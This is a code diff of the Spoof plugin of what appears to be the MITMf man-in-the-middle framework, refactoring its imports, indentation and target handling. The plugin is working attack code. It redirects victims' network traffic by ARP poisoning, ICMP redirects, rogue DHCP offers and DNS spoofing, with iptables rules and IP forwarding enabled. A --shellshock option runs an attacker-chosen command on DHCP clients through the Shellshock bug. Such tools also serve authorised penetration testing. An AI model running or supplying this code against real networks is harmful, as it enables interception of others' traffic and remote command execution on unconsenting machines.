@@ -19,111 +19,122 @@
 #
 
 import logging
-import sys
 
+from sys import exit
 from core.utils import SystemConfig, IpTables
-from core.sslstrip.DnsCache import DnsCache
-from core.wrappers.protocols import _ARP, _DHCP, _ICMP
+from core.protocols.arp.ARPpoisoner import ARPpoisoner
+from core.protocols.arp.ARPWatch import ARPWatch
+from core.dnschef.DNSchef import DNSChef
+from core.protocols.dhcp.DHCPServer import DHCPServer
+from core.protocols.icmp.ICMPpoisoner import ICMPpoisoner
 from plugins.plugin import Plugin
-from core.dnschef.dnschef import DNSChef
-
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
 
 class Spoof(Plugin):
-	name        = "Spoof"
-	optname     = "spoof"
-	desc        = "Redirect/Modify traffic using ICMP, ARP, DHCP or DNS"
-	version     = "0.6"
-	has_opts    = True
+    name        = "Spoof"
+    optname     = "spoof"
+    desc        = "Redirect/Modify traffic using ICMP, ARP, DHCP or DNS"
+    tree_output = list()
+    version     = "0.6"
+    has_opts    = True
 
-	def initialize(self, options):
-		'''Called if plugin is enabled, passed the options namespace'''
-		self.options = options
-		self.dnscfg = options.configfile['MITMf']['DNS']
-		self.dhcpcfg = options.configfile['Spoof']['DHCP']
-		self.target = options.target
-		self.manualiptables = options.manualiptables
-		self.protocolInstances = []
+    def initialize(self, options):
+        '''Called if plugin is enabled, passed the options namespace'''
+        self.options           = options
+        self.dnscfg            = self.config['MITMf']['DNS']
+        self.dhcpcfg           = self.config['Spoof']['DHCP']
+        self.targets           = options.targets
+        self.manualiptables    = options.manualiptables
+        self.mymac             = SystemConfig.getMAC(options.interface)
+        self.myip              = SystemConfig.getIP(options.interface)
+        self.protocolInstances = []
 
-		#Makes scapy more verbose
-		debug = False
-		if options.log_level is 'debug':
-			debug = True
+        #Makes scapy more verbose
+        debug = False
+        if options.log_level == 'debug':
+            debug = True
 
-		if options.arp:
+        if options.arp:
 
-			if not options.gateway:
-				sys.exit("[-] --arp argument requires --gateway")
+            if not options.gateway:
+                exit("[-] --arp argument requires --gateway")
 
-			arp = _ARP(options.gateway, options.interface, options.mac_address)
-			arp.target = options.target
-			arp.arpmode = options.arpmode
-			arp.debug = debug
+            if options.targets is None:
+                #if were poisoning whole subnet, start ARP-Watch
+                arpwatch = ARPWatch(options.gateway, self.myip, options.interface)
+                arpwatch.debug = debug
 
-			self.protocolInstances.append(arp)
+                self.tree_output.append("ARPWatch online")
+                self.protocolInstances.append(arpwatch)
 
-		elif options.icmp:
+            arp = ARPpoisoner(options.gateway, options.interface, self.mymac, options.targets)
+            arp.arpmode = options.arpmode
+            arp.debug = debug
 
-			if not options.gateway:
-				sys.exit("[-] --icmp argument requires --gateway")
+            self.protocolInstances.append(arp)
 
-			if not options.target:
-				sys.exit("[-] --icmp argument requires --target")
 
-			icmp = _ICMP(options.interface, options.target, options.gateway, options.ip_address)
-			icmp.debug = debug
+        elif options.icmp:
 
-			self.protocolInstances.append(icmp)
+            if not options.gateway:
+                exit("[-] --icmp argument requires --gateway")
 
-		elif options.dhcp:
+            if not options.targets:
+                exit("[-] --icmp argument requires --targets")
 
-			if options.target:
-				sys.exit("[-] --target argument invalid when DCHP spoofing")
+            icmp = ICMPpoisoner(options.interface, options.targets, options.gateway, options.ip_address)
+            icmp.debug = debug
 
-			dhcp = _DHCP(options.interface, self.dhcpcfg, options.ip_address, options.mac_address)
-			dhcp.shellshock = options.shellshock
-			dhcp.debug = debug
-			self.protocolInstances.append(dhcp)
+            self.protocolInstances.append(icmp)
 
-		if options.dns:
+        elif options.dhcp:
 
-			if not options.manualiptables:
-				if IpTables.getInstance().dns is False:
-					IpTables.getInstance().DNS(options.ip_address, self.dnscfg['port'])
+            if options.targets:
+                exit("[-] --targets argument invalid when DCHP spoofing")
 
-			DNSChef.getInstance().loadRecords(self.dnscfg)
+            dhcp = DHCPServer(options.interface, self.dhcpcfg, options.ip_address, options.mac_address)
+            dhcp.shellshock = options.shellshock
+            dhcp.debug = debug
+            self.protocolInstances.append(dhcp)
 
-		if not options.arp and not options.icmp and not options.dhcp and not options.dns:
-			sys.exit("[-] Spoof plugin requires --arp, --icmp, --dhcp or --dns")
+        if options.dns:
 
-		SystemConfig.setIpForwarding(1)
+            if not options.manualiptables:
+                if IpTables.getInstance().dns is False:
+                    IpTables.getInstance().DNS(self.myip, self.dnscfg['port'])
 
-		if not options.manualiptables:
-			if IpTables.getInstance().http is False:
-				IpTables.getInstance().HTTP(options.listen)
+            DNSChef.getInstance().loadRecords(self.dnscfg)
 
-		for protocol in self.protocolInstances:
-			protocol.start()
+        if not options.arp and not options.icmp and not options.dhcp and not options.dns:
+            exit("[-] Spoof plugin requires --arp, --icmp, --dhcp or --dns")
 
-	def add_options(self, options):
-		group = options.add_mutually_exclusive_group(required=False)
-		group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
-		group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
-		group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
-		options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Proxy/Modify DNS queries')
-		options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
-		options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
-		options.add_argument('--target', dest='target', default=None, help='Specify a host to poison [default: subnet]')
-		options.add_argument('--arpmode',type=str, dest='arpmode', default='req', choices=["req", "rep"], help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
-		#options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
+        SystemConfig.setIpForwarding(1)
 
-	def finish(self):
-		for protocol in self.protocolInstances:
-			if hasattr(protocol, 'stop'):
-				protocol.stop()
+        if not options.manualiptables:
+            IpTables.getInstance().Flush()
+            if IpTables.getInstance().http is False:
+                IpTables.getInstance().HTTP(options.listen)
 
-		if not self.manualiptables:
-			IpTables.getInstance().Flush()
+        for protocol in self.protocolInstances:
+            protocol.start()
 
-		SystemConfig.setIpForwarding(0)
+    def add_options(self, options):
+        group = options.add_mutually_exclusive_group(required=False)
+        group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
+        group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
+        group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
+        options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Proxy/Modify DNS queries')
+        options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
+        options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
+        options.add_argument('--targets', dest='targets', default=None, help='Specify host/s to poison [if ommited will default to subnet]')
+        options.add_argument('--arpmode',type=str, dest='arpmode', default='rep', choices=["rep", "req"], help=' ARP Spoofing mode: replies (rep) or requests (req) [default: rep]')
+
+    def finish(self):
+        for protocol in self.protocolInstances:
+            if hasattr(protocol, 'stop'):
+                protocol.stop()
+
+        if not self.manualiptables:
+            IpTables.getInstance().Flush()
+
+        SystemConfig.setIpForwarding(0)
